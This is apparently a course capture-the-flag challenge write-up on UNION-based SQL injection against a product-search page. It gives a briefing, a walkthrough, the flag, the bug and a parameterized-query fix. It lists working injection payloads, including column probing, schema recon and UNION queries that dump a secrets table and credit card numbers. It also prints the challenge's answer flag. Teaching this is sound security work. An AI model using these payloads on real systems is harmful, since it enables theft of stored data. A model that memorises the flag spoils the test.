# 04 — SQL Injection: UNION-based Data Extraction · Hard · 250 pts

**OWASP:** A03:2021 Injection · **Course ref:** Ch05 SQL Injection, Lab4 Mutillidae
(`' union select ccid,ccnumber,... from credit_cards --`).

## Scenario / Briefing (shown to students in-app)
You're testing a product-search page. Behind it, a query pulls rows from the database and prints them on the page.
If you can bolt your *own* SELECT onto theirs, the page will happily print whatever you ask for — including a table it
was never meant to show. (This is exactly the credit-card extraction technique from the Mutillidae lab.)
**Your objective:** use a UNION query to dump the hidden `secrets` table and read the flag.

## Walkthrough
1. Search `mouse` → rows with **Name / Category / Price**. Search `'` → database error → injectable.
2. Find the column count:
   - `' ORDER BY 3 --` → works
   - `' ORDER BY 4 --` → *1st ORDER BY term out of range* → **3 columns**
3. Optional recon — list tables: `' UNION SELECT name, sql, NULL FROM sqlite_master --`
   (shows `products`, `secrets`, `credit_cards`).
4. Dump the flag:
   ```
   ' UNION SELECT flag, NULL, NULL FROM secrets --
   ```
   Bonus (Mutillidae replay): `' UNION SELECT ccid, ccnumber, expiration FROM credit_cards --`

Flag: `FLAG{un1on_based_data_dump}`

## The bug
`search_page()` concatenates `q` into `... WHERE name LIKE '%<q>%'` (`# ======= VULN HERE =======`), and the page
reflects every returned column, so attacker-chosen rows from any table are displayed.

## The fix
```python
con.execute("SELECT name, category, price FROM products WHERE name LIKE ?", ('%' + q + '%',))
```
Plus least privilege (the web app's DB account should not be able to read `secrets`/`credit_cards`) and generic errors.
